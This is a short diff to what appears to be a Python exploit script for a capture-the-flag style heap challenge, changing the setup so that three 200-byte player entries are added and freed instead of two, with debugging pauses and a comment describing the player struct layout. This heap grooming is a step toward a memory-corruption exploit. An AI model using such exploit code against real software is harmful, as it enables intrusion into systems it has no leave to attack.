@@ -62,15 +62,17 @@ def hex_dump(s):
 if __name__ == "__main__":
     r.recvuntil('Your choice:')
 
-    add('A'*200, 0xc8)
-    add('B'*200, 0xc9)
-    raw_input('after adding AB...')
+    add('A'*200, 0xc7)
+    add('B'*200, 0xc8)
+    add('C'*200, 0xc9)
+    raw_input('after adding ABC...')
 
     select(0)
 
     remove(0)
     remove(1)
-    raw_input('after removing AB...')
+    remove(2)
+    raw_input('after removing ABC...')
 
     #
     # typedef _player_st { DWORD attack, defense, speed, precision; char * name } player_st;
